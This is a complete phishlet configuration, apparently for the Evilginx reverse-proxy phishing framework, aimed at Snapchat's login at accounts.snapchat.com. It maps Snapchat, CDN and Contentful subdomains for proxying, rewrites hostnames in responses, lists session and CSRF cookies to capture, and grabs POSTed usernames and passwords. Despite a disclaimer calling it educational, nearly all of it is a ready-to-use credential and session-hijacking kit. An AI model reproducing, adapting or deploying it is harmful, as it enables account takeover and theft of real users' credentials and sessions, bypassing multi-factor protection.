# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
# PLEASE DO NOT MISUSE THIS PHISHLET.
# Updated based on live browser testing and network analysis - Nov 2025

author: '@an0nud4y'
min_ver: '2.3.0'
proxy_hosts:
  # Main authentication domain
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
  
  # Base domains
  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
  
  # Static content delivery
  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: false, is_landing: false}
  
  # API endpoints - GCP region
  - {phish_sub: 'us-central1-gcp.api', orig_sub: 'us-central1-gcp.api', domain: 'snapchat.com', session: false, is_landing: false}
  - {phish_sub: 'gcp.api', orig_sub: 'gcp.api', domain: 'snapchat.com', session: false, is_landing: false}
  
  # API endpoints - AWS region
  - {phish_sub: 'aws.api', orig_sub: 'aws.api', domain: 'snapchat.com', session: false, is_landing: false}
  
  # Session and security services
  - {phish_sub: 'session', orig_sub: 'session', domain: 'snapchat.com', session: false, is_landing: false}
  
  # Story service
  - {phish_sub: 'story', orig_sub: 'story', domain: 'snapchat.com', session: false, is_landing: false}
  
  # Static CDN
  - {phish_sub: '', orig_sub: '', domain: 'sc-static.net', session: false, is_landing: false}
  
  # Third-party services (Contentful CMS)
  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'contentful.com', session: false, is_landing: false}

sub_filters:
  # Main accounts domain filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # WWW domain filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Static content filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'static', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'static', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
  
  # API endpoint filters - GCP
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'us-central1-gcp.api', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'us-central1-gcp.api', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'application/grpc-web+proto']}
  
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'gcp.api', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'gcp.api', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'application/grpc-web+proto']}
  
  # API endpoint filters - AWS
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'aws.api', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'aws.api', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'application/grpc-web+proto']}
  
  # Session service filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'session', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'session', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'application/grpc-web+proto']}
  
  # Story service filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'story', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'story', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json']}
  
  # Static CDN filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: '', domain: 'sc-static.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: '', domain: 'sc-static.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css']}
  
  # Contentful CMS filters
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'graphql', domain: 'contentful.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'graphql', domain: 'contentful.com', search: '{hostname}', replace: '{hostname}', mimes: ['application/json', 'application/graphql']}

auth_tokens:
  # Primary domain cookies - captured from live browser testing
  - domain: '.snapchat.com'
    keys: ['_sc-sid', 'sc-wcid', 'blizzard_client_id', 'blizzard_web_session_id', 'sc-cookies-accepted', 'sc-language', 'EssentialSession', 'Preferences', 'Performance', 'Marketing', '.*,regexp']
  
  # Account-specific cookies (for compatibility with older phishlet)
  - domain: 'accounts.snapchat.com'
    keys: ['web_client_id', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', 'sc-a-nonce', '.*,regexp']

auth_urls:
  - '/accounts/welcome'
  - '/v2/welcome'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.snapchat.com'
  path: '/v2/login'